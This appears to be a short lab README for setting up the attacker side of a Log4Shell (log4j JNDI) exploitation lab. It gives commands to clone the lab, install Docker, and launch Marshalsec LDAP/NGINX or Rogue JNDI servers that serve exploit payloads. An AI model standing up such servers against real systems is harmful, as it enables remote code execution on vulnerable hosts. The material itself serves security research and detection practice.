# Attacker Server

## Clone Repository

```bash
sudo su

git clone https://github.com/Cyb3rWard0g/log4jshell-lab
```

## Install Docker

```bash
wget https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/scripts/bash/Install-Docker.sh
chmod +x Install-Docker.sh

./Install-Docker.sh
```
## Option 1: Marshalsec LDAP and NGINX Web Servers

```bash
cd log4jshell-lab/attacker/

docker-compose -f MarshalsecLDAP-NginxWebServer.yml up --build -d
```

## Option 2: Rogue JNDI

```bash
cd log4jshell-lab/attacker/rogue-jndi/

docker build . -t rogue-jndi
docker run --rm -ti -e PAYLOAD_IP=192.168.2.6 -p 1389:1389 -p 8888:8888 rogue-jndi
```
